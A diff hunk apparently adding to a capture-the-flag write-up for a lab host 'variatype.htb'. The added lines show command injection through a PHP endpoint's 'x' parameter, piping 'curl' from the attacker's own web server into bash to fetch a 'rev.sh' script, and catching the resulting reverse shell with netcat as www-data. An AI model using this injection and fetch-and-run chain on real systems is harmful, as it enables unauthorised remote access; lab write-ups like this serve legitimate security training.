@@ -368,5 +368,17 @@ curl -s "http://portal.variatype.htb/files/glyph-check.php?x=id"
 then i got the shell:
 
 ```
+ajdev@rootbox:~$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.129.8.177 - - [15/Mar/2026 15:20:43] "GET /rev.sh HTTP/1.1" 200 -
 
+~$ curl -s "http://portal.variatype.htb/files/glyph-check.php?x=curl+10.10.15.156:8080/rev.sh|bash"
+
+ajdev@rootbox:~$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.8.177 33432
+bash: cannot set terminal process group (3400): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@variatype:~/portal.variatype.htb/public/files$ 
 ```
+
